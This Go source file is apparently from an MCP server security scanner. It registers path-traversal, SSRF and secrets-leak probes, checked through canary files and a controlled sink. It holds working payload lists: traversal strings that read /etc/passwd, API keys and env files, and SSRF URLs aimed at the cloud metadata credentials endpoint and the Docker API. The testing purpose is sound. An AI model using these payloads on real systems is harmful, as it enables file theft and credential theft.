package battery

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/redfilade/redfilade/internal/mcp"
	"github.com/redfilade/redfilade/internal/scenario"
)

// Builder-mode world for L2: planted files a vulnerable server should never
// be able to read or change. Paths live under /world inside the cell.
const (
	builderCanaryPath    = "redfilade/canary.txt"
	builderProtectedPath = "redfilade/protected.txt"
)

func init() {
	register(Attack{
		ID:     "l2-path-traversal",
		Level:  "L2",
		Family: "06",
		Title:  "Path traversal reads or writes files outside the allowed area",
		Checks: []scenario.Check{
			{Fact: "sensitive_file_read"},
			{Fact: "canary_leaked", Canary: "WORLD"},
			{Fact: "world_file_changed", Path: builderProtectedPath},
		},
		World: []scenario.File{
			{Path: builderCanaryPath, Content: "{{canary.WORLD}}\n"},
			{Path: builderProtectedPath, Content: "This file must never be modified by the server under test.\n"},
		},
		Network: "none",
		Run:     pathTraversal,
	})
	register(Attack{
		ID:      "l2-ssrf",
		Level:   "L2",
		Family:  "05",
		Title:   "Server-side request forgery: the server fetches attacker-chosen URLs",
		Checks:  []scenario.Check{{Fact: "egress_reached_sink"}, {Fact: "canary_leaked", Canary: scenario.SinkCanary}, {Fact: "sensitive_file_read"}},
		Network: "sink",
		Run:     ssrf,
	})
	register(Attack{
		ID:     "l2-secrets-in-output",
		Level:  "L2",
		Family: "08",
		Title:  "Tool output exposes secrets from the server's environment",
		Checks: []scenario.Check{{Fact: "secret_pattern_leaked"}, {Fact: "canary_leaked", Canary: "ENV"}},
		Env: []scenario.EnvVar{
			{Name: "REDFILADE_PROBE_API_KEY", Value: "{{canary.ENV}}"},
		},
		Network: "none",
		Run:     secretsInOutput,
	})
}

// --- schema helpers ----------------------------------------------------------

type property struct {
	Type   any    `json:"type"`
	Format string `json:"format"`
	Enum   []any  `json:"enum"`
	Desc   string `json:"description"`
}

type schema struct {
	Properties map[string]property `json:"properties"`
	Required   []string            `json:"required"`
}

func parseSchema(raw json.RawMessage) schema {
	var s schema
	_ = json.Unmarshal(raw, &s)
	return s
}

// minimalArgs returns harmless valid-looking values for every required field.
func minimalArgs(s schema) map[string]any {
	args := map[string]any{}
	for _, name := range s.Required {
		p := s.Properties[name]
		if len(p.Enum) > 0 {
			args[name] = p.Enum[0]
			continue
		}
		switch fmt.Sprint(p.Type) {
		case "integer", "number":
			args[name] = 1
		case "boolean":
			args[name] = false
		case "array":
			args[name] = []any{}
		case "object":
			args[name] = map[string]any{}
		default:
			args[name] = "redfilade"
		}
	}
	return args
}

// stringParams returns string parameters whose name or description matches re,
// in a stable order.
func stringParams(s schema, re *regexp.Regexp) []string {
	var out []string
	for name, p := range s.Properties {
		t := fmt.Sprint(p.Type)
		if t != "string" && t != "<nil>" && t != "[string null]" {
			continue
		}
		if re.MatchString(strings.ToLower(name)) || re.MatchString(strings.ToLower(p.Desc)) || (re == reURLParam && p.Format == "uri") {
			out = append(out, name)
		}
	}
	sort.Strings(out)
	return out
}

func toolsUpTo(tools []mcp.Tool) []mcp.Tool {
	if len(tools) > maxToolsProbed {
		return tools[:maxToolsProbed]
	}
	return tools
}

// --- l2-path-traversal -------------------------------------------------------

var (
	rePathParam    = regexp.MustCompile(`path|file|name|doc|dir|folder|key|page|template|resource|attachment|document`)
	reContentParam = regexp.MustCompile(`content|data|body|text|note|value`)
)

var readPayloads = []string{
	"../" + builderCanaryPath,
	"../../" + builderCanaryPath,
	"../../../../../../world/" + builderCanaryPath,
	"/world/" + builderCanaryPath,
	"../../../../../../etc/passwd",
	"/etc/passwd",
	"....//....//....//etc/passwd",
	"..%2f..%2f..%2fetc%2fpasswd",
	"../secrets/api.key",
	"../../secrets/api.key",
}

var writePayloads = []string{
	"../" + builderProtectedPath,
	"../../" + builderProtectedPath,
	"../../../../../../world/" + builderProtectedPath,
	"/world/" + builderProtectedPath,
	"../config/app.env",
	"../../config/app.env",
}

func pathTraversal(ctx context.Context, c *mcp.Client, tools []mcp.Tool, _ Env) error {
	for _, t := range toolsUpTo(tools) {
		s := parseSchema(t.InputSchema)
		paths := stringParams(s, rePathParam)
		if len(paths) == 0 {
			continue
		}
		contents := stringParams(s, reContentParam)
		for _, p := range paths[:min(len(paths), 3)] {
			payloads := readPayloads
			if len(contents) > 0 {
				payloads = append(append([]string{}, readPayloads...), writePayloads...)
			}
			for _, payload := range payloads {
				args := minimalArgs(s)
				args[p] = payload
				for _, cp := range contents {
					if cp != p {
						args[cp] = "redfilade path traversal probe"
					}
				}
				if _, err := c.CallTool(ctx, t.Name, args); err != nil {
					return fmt.Errorf("probe %q: %w", t.Name, err)
				}
			}
		}
	}
	return nil
}

// --- l2-ssrf -------------------------------------------------------------------

var reURLParam = regexp.MustCompile(`url|uri|link|href|endpoint|webhook|callback|feed|source|host|address|site`)

func ssrf(ctx context.Context, c *mcp.Client, tools []mcp.Tool, env Env) error {
	payloads := []string{
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://[::ffff:169.254.169.254]/latest/meta-data/",
		"http://localhost:2375/containers/json",
		"file:///etc/passwd",
	}
	if env.SinkURL != "" {
		// The sink is the one destination that can actually answer; reaching
		// it proves the server fetches attacker-chosen URLs.
		payloads = append([]string{env.SinkURL + "/redfilade-ssrf-probe"}, payloads...)
	}
	for _, t := range toolsUpTo(tools) {
		s := parseSchema(t.InputSchema)
		for _, p := range stringParams(s, reURLParam) {
			for _, payload := range payloads {
				args := minimalArgs(s)
				args[p] = payload
				if _, err := c.CallTool(ctx, t.Name, args); err != nil {
					return fmt.Errorf("probe %q: %w", t.Name, err)
				}
			}
		}
	}
	return nil
}

// --- l2-secrets-in-output --------------------------------------------------------

func secretsInOutput(ctx context.Context, c *mcp.Client, tools []mcp.Tool, _ Env) error {
	for _, t := range toolsUpTo(tools) {
		s := parseSchema(t.InputSchema)
		if _, err := c.CallTool(ctx, t.Name, minimalArgs(s)); err != nil {
			return fmt.Errorf("call %q: %w", t.Name, err)
		}
	}
	return nil
}
